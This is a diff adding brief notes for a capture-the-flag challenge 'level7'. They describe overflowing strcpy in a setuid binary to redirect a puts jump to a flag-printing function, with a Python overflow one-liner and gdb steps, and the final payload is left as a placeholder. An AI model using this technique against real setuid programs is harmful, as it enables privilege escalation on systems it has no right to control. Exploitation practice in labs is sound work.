@@ -1,0 +1,33 @@
+level7 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
+
+
+2.
+$ ./level7
+Segmentation fault (core dumped)
+$ ./level7 <argument1>
+Segmentation fault (core dumped)
+$ ./level7 <argument1> <argument2>
+~~
+
+3. ghidra usage 
+
+find that can overflow the strcpy function to call m, which printing the global variable, which have flag in it
+
+4. ./level7 $(python -c 'print "A"* <offset>') A
+find offset that it is 20
+
+5. gdb ./level7
+info functions m
+get the address of m function
+and get the puts address
+info functions puts
+x/i <address of puts>
+to get jmp address
+
+6. 
+$ <overflow.txt>
